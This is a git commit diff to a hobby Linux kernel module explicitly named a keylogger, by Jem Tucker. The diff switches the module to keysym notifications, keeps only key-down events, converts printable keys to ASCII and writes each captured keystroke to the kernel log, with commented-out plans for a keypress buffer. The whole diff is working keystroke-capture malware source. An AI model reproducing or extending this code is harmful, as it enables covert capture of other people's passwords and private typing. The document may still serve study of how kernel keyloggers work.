14150fc553f24fcfae2849f7fb73da22fb9abe86
Jem Tucker <jem.tucker@gmail.com>
2017-03-11 11:46:13 +0000

    Log keys instead of logging random keycodes only care about down events

--- inc/keylogger.h
+++ inc/keylogger.h
@@ -1,7 +1,21 @@
 #ifndef __KEYLOGGER_H_
 #define __KEYLOGGER_H_
 
+/**
+ * Register for callbacks from the keyboard driver
+ */
 int keylogger_register(void);
+
+/**
+ * Unregister for callbacks from the keyboard driver
+ */
 void keylogger_unregister(void);
+
+/**
+ * Return the last N keypress events, flushing them from the internal
+ * buffer.
+ * Returns zero on success otherwise an error code.
+ */
+//int keylogger_last_events(unsigned int* buf, size_t len);
 
 #endif
--- src/keylogger.c
+++ src/keylogger.c
@@ -3,12 +3,41 @@
 
 #include <linux/notifier.h>
 #include <linux/keyboard.h>
+#include <linux/spinlock.h>
 
 static int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param);
+
+//static const size_t NUM_CHARS = 100;
+//static struct char s_chars[NUM_CHARS];
+
+//static spinlock_t s_lock = SPIN_LOCK_UNLOCKED;
 
 static struct notifier_block s_nblk = {
     .notifier_call = keylogger_notify
 };
+
+/**
+ * Write keypress events as ASCII chars to the internal buffer
+ */
+void store_event(struct keyboard_notifier_param* param) {
+    //static size_t charCouter = 0;
+    unsigned char value;
+
+    // Only save down events
+    if (!param->down) {
+        return;
+    }
+
+    // Get the ASCII value from the param and store it in
+    // the next slot in the buffer
+    value = param->value & 0x00ff;
+
+    LOG_INFO(
+        "Keylogger event: %c %s\n",
+        value,
+        (param->down ? "down" : "up")
+        );
+}
 
 /**
  * Register for callbacks from the keyboard driver
@@ -25,14 +54,15 @@ void keylogger_unregister(void) {
 }
 
 /**
- * Handle a notificatio from the keyboard driver about a keypress event.
+ * Handle a notification from the keyboard driver about a keypress event.
  * Returns NOTIFY_OK on success or if the event was ignored.
  */
 int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param) {
+    unsigned char type;
     struct keyboard_notifier_param* kbdParam = param;
 
-    // We are only interested in keycode notifications, ignore everything else.
-    if (code != KBD_KEYCODE) {
+    // We are only interested in keysym notifications.
+    if (code != KBD_KEYSYM) {
         return NOTIFY_OK;
     }
 
@@ -41,12 +71,19 @@ int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param
         return NOTIFY_BAD;
     }
 
-    // Log the event
-    LOG_INFO(
-        "Keylogger event: %d %s\n",
-        kbdParam->value,
-        (kbdParam->down ? "down" : "up")
-        );
+    // Translate the keysym into a ascii char. If it is not a printable character
+    // ignore it for now.
+    type = (kbdParam->value >> 8) & 0x0f;
+    switch (type) {
+    case 0x0:
+    case 0xb:
+        // ASCII 'printable' chars.
+        store_event(kbdParam);
+        break;
+    default:
+        // Ignore everything else
+        break;
+    }
 
     return NOTIFY_OK;
 }
